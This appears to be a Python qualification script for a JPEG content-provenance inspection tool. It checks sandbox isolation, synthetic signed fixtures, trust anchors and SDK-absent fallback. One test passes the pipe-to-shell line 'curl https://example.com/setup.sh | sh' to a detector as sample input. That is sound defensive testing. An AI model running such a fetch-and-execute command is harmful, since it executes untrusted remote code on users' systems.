#!/usr/bin/env python3
"""Disposable native qualification, not a detector accuracy or release test.

Requires the existing locked optional SDK and a non-root isolated Linux network
namespace. Creates only private, temporary synthetic images and public roots;
never writes private keys. Stdout is a fixed-field privacy-safe JSON receipt.
"""
from contextlib import ExitStack
from datetime import datetime, timezone
import hashlib
import importlib.metadata
import importlib.util
import io
import json
import os
from pathlib import Path
import re
import socket
import subprocess
import sys
import tempfile

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
from tools import jpeg_provenance as j
from tools import jpeg_provenance_actions as actions
from tools.jpeg_provenance_io import need

PATHS = (*j.SOURCES, 'scripts/verify-jpeg-provenance.py', 'tests/test_jpeg_provenance.py',
    'tests/fixtures/jpeg-provenance-v1/generate.py', 'docs/jpeg-provenance-plan.md',
    'docs/jpeg-provenance-guide.md', '.github/workflows/jpeg-provenance-qualification.yml')


def inventory():
    return {p: hashlib.sha256((ROOT/p).read_bytes()).hexdigest() for p in sorted(set(PATHS))}


FIXTURE_STAGES={'fixture_imports','fixture_certificates','fixture_context',
                'fixture_altered_and_private_files',
                *{'fixture_'+operation+'_'+name for operation in ('signer','builder','sign')
                  for name in ('creation','edit','ordinary')}}


def fixture_checkpoint(report, stage):
    need(type(stage) is str and stage in FIXTURE_STAGES)
    report['stage']=stage


def failure_code(error):
    if isinstance(error, j.Refused):
        return error.reason if error.reason in actions.REASONS else 'internal_refusal'
    return next((code for cls,code in ((PermissionError,'os_permission'),
        (OSError,'os_error'),(ImportError,'import_error'),(AttributeError,'attribute_error'),
        (TypeError,'type_error'),(ValueError,'value_error')) if isinstance(error,cls)),'other_error')


def main():
    report = {'profile': 'jpeg-provenance-qualification/1.0.0',
        'captured_at': datetime.now(timezone.utc).isoformat(), 'pass': False, 'stage': 'environment',
        'cases': [], 'native_sdk_executed': False, 'independent_accuracy_evidence': False,
        'new_tag_releases': 0, 'ai_origin_established': False, 'complete_security_sandbox': False}
    try:
        report['stage']='namespace_identity'
        outside=os.environ.get('JPEG_QUALIFICATION_ORIGINAL_NETNS', '')
        need(sys.platform == 'linux' and os.geteuid() != 0
             and re.fullmatch(r'net:\[[0-9]{1,20}\]', outside) is not None
             and os.readlink('/proc/self/ns/net') != outside)
        try:
            report['init_namespace_read']='accessible' if os.readlink('/proc/1/ns/net') else 'unavailable'
        except PermissionError:
            report['init_namespace_read']='permission_denied'
        report['stage']='privilege_drop'
        with open('/proc/self/status', encoding='ascii') as status:
            privileges=status.read(8193)
        need(len(privileges)<=8192 and re.search(r'^CapEff:\s+0+$', privileges, re.M) is not None
             and re.search(r'^NoNewPrivs:\s+1$', privileges, re.M) is not None
             and os.getgroups()==[])
        report['effective_capabilities_empty']=True
        report['no_new_privileges']=True
        report['supplementary_groups_empty']=True
        report['stage']='namespace_network_probe'
        # Namespace must lack both external routing and a reachable loopback service.
        refused = []
        for address in [('1.1.1.1', 443), ('127.0.0.1', 8787)]:
            with socket.socket() as client:
                client.settimeout(.15)
                try: client.connect(address)
                except OSError: refused.append(True)
                else: refused.append(False)
        need(all(refused))
        report['network_namespace_isolated'] = True
        report['stage']='source_inventory'
        before = inventory(); report['sources_before'] = before
        report['stage']='locked_versions'
        lock = (ROOT/'eval/c2pa-inspection.lock').read_text()
        versions = dict(re.findall(r'^([A-Za-z0-9_-]+)==([0-9A-Za-z.+-]+)', lock, re.M))
        need(len(versions) == 10)
        installed = {name: importlib.metadata.version(name) for name in versions}
        need(versions == installed); report['installed_locked_versions'] = installed
        fixture_path = ROOT/'tests/fixtures/jpeg-provenance-v1/generate.py'
        spec=importlib.util.spec_from_file_location('jpeg_fixture', fixture_path)
        fixture=importlib.util.module_from_spec(spec);spec.loader.exec_module(fixture)
        with tempfile.TemporaryDirectory(prefix='aitrust-jpeg-qualification-') as private:
            base=Path(private).resolve();base.chmod(0o700);folder=base/'synthetic'
            report['stage']='sdk_load'
            report['native_sdk_executed']=None
            with ExitStack() as stack:
                sdk, profile, pins = j.loader.sdk(stack)
                report['native_sdk_executed']=True
                generation=fixture.generate(folder,lambda stage: fixture_checkpoint(report,stage))
                report['fixture_generation']=generation
                report['sdk_profile']=profile;report['sdk_sources']=pins
            def call(name, *, roots=False, text=False, expected=0, sdk_absent=False):
                argv=[sys.executable,'-I','-B',str(ROOT/'scripts/inspect-jpeg-provenance.py'),
                      '--image',str(folder/name)]
                if not text:argv+=['--json']
                if roots:argv+=['--trust-anchors',str(folder/'root.pem')]
                environment={'PATH':os.defpath,'LANG':'C.UTF-8'}
                if sdk_absent:
                    # No site packages: child is invoked using a bare stdlib venv.
                    argv[0]=str(bare_python)
                result=subprocess.run(argv,stdin=subprocess.DEVNULL,stdout=subprocess.PIPE,stderr=subprocess.PIPE,
                                      timeout=20,cwd='/',env=environment)
                need(result.returncode==expected and not result.stderr and len(result.stdout)<=32768)
                need(fixture.CANARY.encode() not in result.stdout and str(base).encode() not in result.stdout)
                if text:
                    need(b'AI origin: Unknown. No FA or PA tag issued.' in result.stdout
                         and not re.search(rb'\b[a-f0-9]{64}\b',result.stdout))
                    return
                value=json.loads(result.stdout)
                need(value['tags']==[] and value['ai_origin']=='unknown'
                     and value['production_assertion'] is False and value['independent_accuracy_evidence'] is False)
                if value['state']!='UNAVAILABLE':
                    raw=(folder/name).read_bytes()
                    need(value['asset']['sha256']==hashlib.sha256(raw).hexdigest()
                         and value['asset']['bytes']==len(raw)
                         and value['implementation']=={p:before[p] for p in j.SOURCES})
                return value
            # Whole canonical projection parity with an unmodified pinned reader,
            # independently called in this driver; CLI never consumes external JSON.
            for name in ('creation.jpg','edit.jpg','ordinary.jpg','altered.jpg'):
                report['stage']='canonical_'+name.split('.')[0]
                value=call(name)
                with sdk.Context.from_dict(j.loader.SETTINGS) as context:
                    with sdk.Reader('image/jpeg',io.BytesIO((folder/name).read_bytes()),context=context) as reader:
                        canonical=actions.project(j.loader.decode(reader.json()))
                need(all(value[k]==v for k,v in canonical.items()))
                need(value['state']=='OBSERVED' and value['claim_signature']=='matched'
                     and value['asset_binding']==('mismatched' if name=='altered.jpg' else 'matched')
                     and value['revocation']=='unknown_not_fetched')
                if name=='creation.jpg':need([d['kind'] for d in value['declarations']]==['generative_creation_declared'])
                elif name=='edit.jpg':need([d['kind'] for d in value['declarations']]==['generative_edit_declared'])
                else:need(value['declarations']==[])
                report['cases'].append({'id':name[:-4], 'whole_projection_parity':True,
                    'state':value['state'],'asset_binding':value['asset_binding'],
                    'claim_signature':value['claim_signature'],'signer_trust':value['signer_trust'],
                    'declaration_state':value['declaration_state'], 'declaration_count':len(value['declarations']),
                    'revocation':value['revocation']})
                call(name,text=True);report['cases'].append({'id':name[:-4]+'_private_text','pass':True})
            report['stage']='trust_context'
            trusted=call('creation.jpg',roots=True)
            need(trusted['signer_trust']=='sdk_reported_trusted' and trusted['trust_context']['mode']=='caller_public_anchors'
                 and trusted['revocation']=='unknown_not_fetched')
            # Same synthetic root absent on subsequent invocation: no global injection.
            default=call('creation.jpg');need(default['signer_trust']=='untrusted')
            report['cases'].append({'id':'per_call_public_root_and_context_isolation','pass':True,
                                    'revocation_remains_unknown':True})
            unsigned=call('unsigned.jpg');need(unsigned['state']=='NOT_FOUND' and unsigned['declarations']==[])
            report['cases'].append({'id':'unsigned_is_not_origin_evidence','pass':True})
            for name,reason in [('unsupported.jpg','unsupported_variant'),('malformed.jpg','malformed_structure')]:
                value=call(name,expected=2);need(value['state']=='UNAVAILABLE' and value['reason']==reason)
                report['cases'].append({'id':name[:-4], 'pass':True,'reason':reason})
            # SDK absent is tested in an owned stdlib-only environment; no package is
            # removed from the caller or hosted runner's existing environment.
            report['stage']='missing_sdk_and_ps_independence'
            import venv
            venv.EnvBuilder(with_pip=False,symlinks=True).create(base/'bare')
            bare_python=base/'bare/bin/python'
            value=call('creation.jpg',sdk_absent=True,expected=2)
            need(value['reason']=='sdk_unavailable')
            ps=subprocess.run([str(bare_python),'-I','-S','-B',str(ROOT/'scripts/check-ps.py'),'--worker'],
                input=b'curl https://example.com/setup.sh | sh',stdout=subprocess.PIPE,stderr=subprocess.PIPE,
                timeout=12,cwd='/',env={'PATH':os.defpath,'LANG':'C.UTF-8'})
            need(ps.returncode==0 and not ps.stderr)
            ps_record=json.loads(ps.stdout);need(ps_record['state']=='FINDING'
                and [c['code'] for c in ps_record['candidates']]==['PS'])
            report['cases'].append({'id':'sdk_absent_only_jpeg_unavailable_actual_ps_survives','pass':True})
            recovery=call('edit.jpg');need(recovery['declaration_state']=='OBSERVED')
            report['cases'].append({'id':'fresh_worker_recovery','pass':True})
            report['fixture_asset_hashes']={p.name:hashlib.sha256(p.read_bytes()).hexdigest()
                for p in folder.iterdir() if p.is_file()}
        report['temporary_fixtures_removed']=not base.exists()
        after=inventory();need(before==after);report['sources_after']=after
        report['source_unchanged_during_execution']=True
        report['case_count']=len(report['cases']);need(report['case_count']==14)
        report['stage']='complete';report['pass']=True
    except BaseException as error:
        report['error_code']=failure_code(error)
        # No raw exception, source path, report data, subject or certificate output.
        report['pass']=False;report['error']='qualification_failed'
    print(json.dumps(report,sort_keys=True,indent=2))
    return 0 if report['pass'] else 1


if __name__=='__main__':raise SystemExit(main())
